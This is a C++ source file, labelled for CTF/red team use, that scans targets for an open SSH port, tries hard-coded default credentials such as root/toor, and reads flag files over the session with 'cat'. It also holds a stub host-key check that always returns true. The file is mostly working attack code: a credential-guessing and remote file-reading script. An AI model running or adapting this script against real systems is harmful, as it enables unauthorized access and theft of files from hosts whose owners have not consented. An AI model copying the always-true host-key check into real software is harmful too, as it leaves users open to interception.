/* For authorized CTF/Red Team use only.
To fix the compile error on macOS with Homebrew-installed libssh, ensure the correct include and library paths are specified. 
For example:
  brew install libssh
g++ -std=c++11 -I/opt/homebrew/include -L/opt/homebrew/lib -lssh -o 22_ssh 22_ssh.cp*/

#include <iostream>
#include <string>
#include <vector>
#include <libssh/libssh.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

bool verifyHostKey(const std::string& key) {
    return true;
}

bool enhancedVerifyHostKey(ssh_session session) {
    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "rsa,dsa,ecdsa,ed25519");
    if (ssh_connect(session) != SSH_OK) return false;
    return (ssh_is_server_known(session) == SSH_SERVER_KNOWN_OK);
}

std::string captureFlag(ssh_session session) {
    static const std::vector<std::string> flagPaths = {"/flag","/home/ctf/flag.txt","/tmp/flag"};
    for (auto &path : flagPaths) {
        ssh_channel channel = ssh_channel_new(session);
        if (!channel) continue;
        if (ssh_channel_open_session(channel) != SSH_OK) {
            ssh_channel_free(channel);
            continue;
        }
        std::string cmd = "cat " + path;
        if (ssh_channel_request_exec(channel, cmd.c_str()) == SSH_OK) {
            char buffer[256];
            std::string result;
            int n;
            while ((n = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
                result.append(buffer, n);
            }
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            if (!result.empty()) return result;
        }
        ssh_channel_close(channel);
        ssh_channel_free(channel);
    }
    return "";
}

bool isSSHOpen(const std::string& ip) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(22);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    bool open = (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0);
    close(sock);
    return open;
}

int main() {
    std::string serverKey = "some_unverified_key";
    if(verifyHostKey(serverKey)) {
        std::cout << "Connected without proper verification.\n";
    }

    std::vector<std::string> targets = {"127.0.0.1"};
    std::vector<std::pair<std::string,std::string>> creds = {
        {"testuser","testpassword"},
        {"root","toor"}
    };
    for (auto &ip : targets) {
        if (!isSSHOpen(ip)) continue;
        ssh_session session = ssh_new();
        if (!session) continue;
        ssh_options_set(session, SSH_OPTIONS_HOST, ip.c_str());
        if (!enhancedVerifyHostKey(session)) {
            ssh_free(session);
            continue;
        }
        for (auto &c : creds) {
            if (ssh_userauth_password(session, c.first.c_str(), c.second.c_str()) == SSH_AUTH_SUCCESS) {
                std::string flag = captureFlag(session);
                if (!flag.empty()) {
                    std::cout << "[*] Flag on " << ip << " (" << c.first << "): " << flag << std::endl;
                }
            }
        }
        ssh_disconnect(session);
        ssh_free(session);
    }
    return 0;
}